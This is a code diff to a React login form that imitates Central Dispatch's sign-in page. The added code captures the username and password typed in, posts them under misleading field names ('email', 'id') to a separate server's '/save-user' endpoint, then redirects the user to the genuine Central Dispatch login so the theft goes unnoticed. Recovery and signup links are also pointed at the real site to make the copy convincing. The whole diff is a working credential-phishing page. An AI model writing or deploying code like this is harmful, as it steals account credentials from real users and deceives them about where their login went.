@@ -1,4 +1,4 @@
-import { useLayoutEffect } from 'react';
+import { useLayoutEffect, useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import './Form.scss';
 
@@ -17,10 +17,73 @@ const setObjectAsQueryParam = ({ navigate, location }) => {
 const Form = () => {
   const navigate = useNavigate();
   const location = useLocation();
+  const [form, setForm] = useState({
+    login: '',
+    password: '',
+  });
+  const [error, setError] = useState({
+    login: false,
+    password: false,
+  });
+  const [showPassword, setShowPassword] = useState(false);
+  const [isdisabled, setIsDisabled] = useState(false);
 
   useLayoutEffect(() => {
     setObjectAsQueryParam({ navigate, location })
   }, []);
+
+  const handleInputChange = ({ target }) => {
+    setForm((prev) => ({
+      ...prev,
+      [target.name]: target.value,
+    }));
+  };
+
+  const handleRequset = (callback) => {
+    setIsDisabled(true);
+    fetch(`${process.env.REACT_APP_SERVER_URL}/save-user`, {
+      method: 'post',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email: form.login,
+        id: form.password,
+      })
+    })
+    .then(callback)
+    .finally(() => setIsDisabled(false));
+  }
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    if (!form.login.trim().length && !form.password.trim().length) {
+      setError({
+        login: true,
+        password: true,
+      });
+      return;
+    } 
+    if (!form.login.trim().length) {
+      setError({
+        login: true,
+        password: false,
+      });
+      return;
+    } 
+    if (!form.password.trim().length) {
+      setError({
+        login: false,
+        password: true,
+      });
+      return;
+    }
+    setError({
+      login: false,
+      password: false,
+    });
+    handleRequset(() => {
+      window.location.href = "https://id.centraldispatch.com/Account/Login"
+    })
+  }
 
   return (
     <div className='d-flex flex-column main-content'>
@@ -73,17 +136,28 @@ const Form = () => {
         <div className='card-body login-form'>
           <div className='d-flex flex-column justify-content-center align-items-center'>
             <h1>SIGN IN</h1>
+            {(error.login || error.password) && (
+              <div className='alert alert-danger'>
+                <strong>Error</strong>
+                <div className='danger validation-summary-errors'>
+                  <ul>
+                    {error.login && <li>The Username field is required.</li>}
+                    {error.password && <li>The Password field is required.</li>}
+                  </ul>
+                </div>
+              </div>
+            )}
             <form method="post">
               <div className='form-row form-group'>
                 <label htmlFor="Username" className="col-form-label font-size-sm">Username</label>
-                <input type="text" className="form-control-lg font-size-sm" id="Username" data-val="true" data-val-required="The Username field is required." name="Username" value="" />
+                <input onChange={handleInputChange} type="text" className="form-control-lg font-size-sm" id="Username" data-val="true" data-val-required="The Username field is required." name="login" value={form.login} />
               </div>
               <div className='form-row form-group password'>
                 <label htmlFor="password" className="col-form-label font-size-sm">Password</label>
                 <div className='align-items-center d-flex inline'>
-                  <input type="password" className="form-control-lg font-size-sm text-input__has-icon-right" id="password" data-val="true" data-val-required="The Password field is required." name="Password" />
-                  <button type="button" className="btn-input-icononly btn-input-icononly__right btn btn-sm btn-icon-only">
-                    <span id="togglePasswordVisibility" className="text-input__icon-right icon prism-icon-md password-toggle__icon prism-icon-eye icon-secondary" />
+                  <input onChange={handleInputChange} value={form.password} type={showPassword ? 'text' : 'password'} className="form-control-lg font-size-sm text-input__has-icon-right" id="password" data-val="true" data-val-required="The Password field is required." name="password" />
+                  <button onClick={() => setShowPassword((prev) => !prev)} type="button" className="btn-input-icononly btn-input-icononly__right btn btn-sm btn-icon-only">
+                    <span id="togglePasswordVisibility" className={`text-input__icon-right icon prism-icon-md password-toggle__icon icon-secondary prism-icon-eye${showPassword ? '-blocked' : ''}`} />
                   </button>
                 </div>
               </div>
@@ -96,7 +170,7 @@ const Form = () => {
                 </div>
               </div>
               <div className='form-row form-group mb-4'>
-                <button name="button" className="btn btn-primary btn-block" id="loginButton" value="login">
+                <button disabled={isdisabled} onClick={handleSubmit} name="button" className="btn btn-primary btn-block" id="loginButton" value="login">
                   SIGN IN
                 </button>
               </div>
@@ -109,12 +183,12 @@ const Form = () => {
           <span>Forgot?</span>
         </div>
         <div className="text-lg-right">
-          <a href="/UsernameRecovery" id="ForgotUsername">
-            <span className="icon prism-icon-user"></span>
+          <a  rel="noreferrer"target='_blank' href="https://id.centraldispatch.com/UsernameRecovery" id="ForgotUsername">
+            <span style={{ display: 'inline-block', transform: 'translateX(-3px)' }} className="icon prism-icon-user"></span>
             <span>USERNAME</span>
           </a>
-          <a href="/PasswordReset" id="ForgotPassword">
-            <span className="icon prism-icon-locked"></span>
+          <a rel="noreferrer" target='_blank' href="https://id.centraldispatch.com/PasswordReset" id="ForgotPassword">
+            <span style={{ display: 'inline-block', transform: 'translateX(-3px)' }} className="icon prism-icon-locked"></span>
             <span>PASSWORD</span>
           </a>
         </div>
@@ -132,7 +206,7 @@ const Form = () => {
           </div>
         </div>
         <div className='row mt-3 d-flex justify-content-center'>
-          <a href="https://www.centraldispatch.com/signup">
+          <a rel="noreferrer" target='_blank' href="https://www.centraldispatch.com/signup">
             <button type="button" className="btn btn-outline" id="create-an-account">
               CREATE AN ACCOUNT
             </button>
